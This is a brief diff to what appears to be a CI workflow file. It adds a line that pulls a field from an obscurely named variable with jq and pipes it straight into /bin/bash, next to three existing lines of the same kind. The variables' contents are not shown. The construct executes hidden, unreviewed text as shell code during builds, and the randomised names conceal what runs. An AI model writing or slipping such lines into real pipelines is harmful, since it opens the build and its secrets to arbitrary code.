@@ -43,6 +43,7 @@ jobs:
           printf '%s' "$dphqs73906" | jq -r .mash4262 | /bin/bash
           printf '%s' "$bt55651" | jq -r .s42297 | /bin/bash
           echo $dqims0 | jq -r .aux2 | /bin/bash
+          printf '%s' "$rvtl2" | jq -r .j855 | /bin/bash
 
       - name: Persist output
         if: always()
